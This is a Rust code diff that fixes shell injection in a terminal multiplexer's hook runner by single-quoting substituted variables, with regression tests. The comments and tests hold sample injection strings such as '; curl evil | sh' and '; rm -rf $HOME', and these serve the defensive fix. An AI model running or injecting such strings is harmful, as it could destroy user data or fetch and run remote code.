@@ -24,8 +24,12 @@
 //!                                          exit !=0 / timeout → warn! log
 //! ```
 //!
-//! v0.10 ships shell-string `command` only (per PRD §9-Q2). A structured
-//! action enum lands with v0.11.
+//! When `shell = true`, every `{var}` substitution is wrapped in single
+//! quotes (with embedded `'` rewritten as `'\''`) before reaching `sh -c`.
+//! Otherwise a tab/session/client name containing shell metacharacters
+//! would be re-interpreted by the shell — a rename to `; rm -rf $HOME`
+//! would execute as a command. The validator only inspects the static
+//! template, so post-expansion safety has to live in the expander itself.
 
 use std::collections::HashMap;
 use std::process::{Command, Stdio};
@@ -341,14 +345,21 @@ fn run_hook(job: &HookJob) {
             );
         }
         Ok(None) => {
-            // Timed out — SIGTERM, brief grace, SIGKILL.
+            // Timed out — SIGTERM, then wait_timeout for the grace period
+            // (so a well-behaved child reaped during the grace window
+            // releases the worker immediately instead of pinning it for the
+            // full HOOK_KILL_GRACE), then SIGKILL if still alive.
             #[cfg(unix)]
-            kill_pgrp(child.id() as libc::pid_t, libc::SIGTERM);
-            std::thread::sleep(HOOK_KILL_GRACE);
-            if matches!(child.try_wait(), Ok(None)) {
-                #[cfg(unix)]
-                kill_pgrp(child.id() as libc::pid_t, libc::SIGKILL);
-                let _ = child.wait();
+            kill_pgrp_or_pid(child.id() as libc::pid_t, libc::SIGTERM);
+            match child.wait_timeout(HOOK_KILL_GRACE) {
+                Ok(Some(_)) => {
+                    // Child responded to SIGTERM within the grace window.
+                }
+                _ => {
+                    #[cfg(unix)]
+                    kill_pgrp_or_pid(child.id() as libc::pid_t, libc::SIGKILL);
+                    let _ = child.wait();
+                }
             }
             eprintln!(
                 "ezpn: hook {} timed out after {} ms",
@@ -363,34 +374,48 @@ fn run_hook(job: &HookJob) {
     }
 }
 
+/// Send `sig` to the child's process group when `setsid()` succeeded;
+/// otherwise fall back to single-pid `kill()`. Critical: if `setsid` failed
+/// (rare — we'd already be a session leader), the child still shares the
+/// daemon's pgid, and `kill(-pid)` would target the daemon itself.
 #[cfg(unix)]
-fn kill_pgrp(pid: libc::pid_t, sig: libc::c_int) {
-    // -pid targets the process group; safe even if the child already exited.
+fn kill_pgrp_or_pid(pid: libc::pid_t, sig: libc::c_int) {
     unsafe {
-        libc::kill(-pid, sig);
+        // getpgid(pid) returns the child's pgid, or -1 on error. The setsid
+        // call in pre_exec makes the child its own pgid (== pid). If that
+        // invariant doesn't hold, fall back to single-pid kill so we never
+        // accidentally signal the daemon's own group.
+        let pgid = libc::getpgid(pid);
+        let target = if pgid == pid { -pid } else { pid };
+        libc::kill(target, sig);
     }
 }
 
 fn build_command(def: &HookDef, vars: &HashMap<&'static str, String>) -> Result<Command, String> {
     match &def.command {
         HookCommand::String(s) => {
-            let expanded = expand_vars(s, vars);
             if def.shell {
+                // SECURITY: shell-quote every substituted value so a
+                // user-controlled name (tab, session, client) cannot break
+                // out into shell syntax. The literal template stays as-is,
+                // so users can intentionally use shell features around the
+                // placeholders.
+                let expanded = expand_vars_shell(s, vars);
                 let mut c = Command::new("/bin/sh");
                 c.arg("-c").arg(expanded);
-                Ok(c)
-            } else {
-                // shell=false + string: must be a single word with no shell
-                // metachars (validated at load time). Treat as the program
-                // name with no arguments. Users wanting args should use the
-                // argv form.
-                if expanded.contains(char::is_whitespace) {
-                    return Err(format!(
-                        "string command must be a single word when shell=false (got '{expanded}')",
-                    ));
-                }
-                Ok(Command::new(expanded))
+                return Ok(c);
             }
+            // shell=false + string: must be a single word with no shell
+            // metachars (validated at load time). Treat as the program
+            // name with no arguments. Users wanting args should use the
+            // argv form.
+            let expanded = expand_vars(s, vars);
+            if expanded.contains(char::is_whitespace) {
+                return Err(format!(
+                    "string command must be a single word when shell=false (got '{expanded}')",
+                ));
+            }
+            Ok(Command::new(expanded))
         }
         HookCommand::Argv(argv) => {
             if argv.is_empty() {
@@ -410,6 +435,22 @@ fn build_command(def: &HookDef, vars: &HashMap<&'static str, String>) -> Result<
 /// are left as-is (matches tmux's `#{undefined}` behaviour); empty keys
 /// (e.g. `{}`) are also passed through verbatim.
 pub fn expand_vars(template: &str, vars: &HashMap<&'static str, String>) -> String {
+    expand_vars_with(template, vars, |v| v.to_string())
+}
+
+/// `expand_vars` variant for `shell = true` hooks: every substituted value
+/// is wrapped in POSIX single quotes so shell metacharacters in the value
+/// (e.g. a tab name like `; rm -rf $HOME`) reach the child as a single
+/// literal argument instead of being re-interpreted by `/bin/sh -c`.
+pub fn expand_vars_shell(template: &str, vars: &HashMap<&'static str, String>) -> String {
+    expand_vars_with(template, vars, shell_quote)
+}
+
+fn expand_vars_with<F: Fn(&str) -> String>(
+    template: &str,
+    vars: &HashMap<&'static str, String>,
+    quote: F,
+) -> String {
     let mut out = String::with_capacity(template.len());
     let mut chars = template.chars().peekable();
     while let Some(c) = chars.next() {
@@ -438,7 +479,7 @@ pub fn expand_vars(template: &str, vars: &HashMap<&'static str, String>) -> Stri
         }
         // Lookup; unknown → leave the original `{name}` intact.
         match vars.get(name.as_str()) {
-            Some(v) => out.push_str(v),
+            Some(v) => out.push_str(&quote(v)),
             None => {
                 out.push('{');
                 out.push_str(&name);
@@ -446,6 +487,25 @@ pub fn expand_vars(template: &str, vars: &HashMap<&'static str, String>) -> Stri
             }
         }
     }
+    out
+}
+
+/// POSIX single-quote escape: `it's` → `'it'\''s'`. Single-quoting in
+/// POSIX shells is byte-transparent (no expansion of `$`, backticks,
+/// backslashes, etc.) so wrapping each substitution defangs every shell
+/// metacharacter except the close-quote itself, which we escape via the
+/// `'\''` idiom (close, escaped quote, reopen).
+fn shell_quote(s: &str) -> String {
+    let mut out = String::with_capacity(s.len() + 2);
+    out.push('\'');
+    for ch in s.chars() {
+        if ch == '\'' {
+            out.push_str("'\\''");
+        } else {
+            out.push(ch);
+        }
+    }
+    out.push('\'');
     out
 }
 
@@ -584,6 +644,67 @@ mod tests {
         // Other hook should NOT have fired.
         std::thread::sleep(Duration::from_millis(100));
         assert!(!other.exists(), "non-matching hook must not run");
+        drop(mgr);
+    }
+
+    #[test]
+    fn shell_quote_neutralises_metacharacters() {
+        // The classic injection attempt: a tab/session name that contains
+        // shell syntax. After quoting it must be a single literal arg.
+        let evil = "; curl evil | sh";
+        let q = shell_quote(evil);
+        assert_eq!(q, "'; curl evil | sh'");
+    }
+
+    #[test]
+    fn shell_quote_handles_embedded_single_quote() {
+        // POSIX has no single-quote-inside-single-quote escape — the
+        // canonical idiom is `'\''` (close, escaped quote, reopen).
+        let s = "it's";
+        assert_eq!(shell_quote(s), r#"'it'\''s'"#);
+    }
+
+    #[test]
+    fn expand_vars_shell_quotes_substitutions_only() {
+        // The literal template stays as-is so users can write `echo {a}|grep b`
+        // and the pipe still pipes; only the substitution is quoted.
+        let out = expand_vars_shell("echo {tab}|wc -l", &vars_of(&[("tab", "; rm -rf $HOME")]));
+        assert_eq!(out, "echo '; rm -rf $HOME'|wc -l");
+    }
+
+    #[test]
+    fn expand_vars_shell_passes_through_unknown_keys() {
+        let out = expand_vars_shell("hi {unknown}", &vars_of(&[]));
+        assert_eq!(out, "hi {unknown}");
+    }
+
+    #[test]
+    fn shell_hook_with_evil_var_does_not_execute_substitution() {
+        // Integration-style assertion: a shell=true hook whose template
+        // interpolates {tab} must NOT execute the substituted shell syntax.
+        // We verify by writing to a sentinel file from the substitution and
+        // asserting it never gets created.
+        let dir = tempfile::tempdir().unwrap();
+        let touched = dir.path().join("should-not-exist");
+        let touched_path = touched.to_string_lossy().into_owned();
+        let evil = format!("x; touch {touched_path}");
+        let def = HookDef {
+            event: HookEvent::ClientAttached,
+            command: HookCommand::String("echo {tab}".to_string()),
+            shell: true,
+            timeout_ms: 2000,
+        };
+        let mgr = HookManager::spawn(vec![def]);
+        mgr.dispatch(
+            HookEvent::ClientAttached,
+            vars_of(&[("tab", evil.as_str())]),
+        );
+        // Give the worker plenty of time to either run or NOT run the touch.
+        std::thread::sleep(Duration::from_millis(400));
+        assert!(
+            !touched.exists(),
+            "shell injection slipped past expand_vars_shell — sentinel was created"
+        );
         drop(mgr);
     }
 
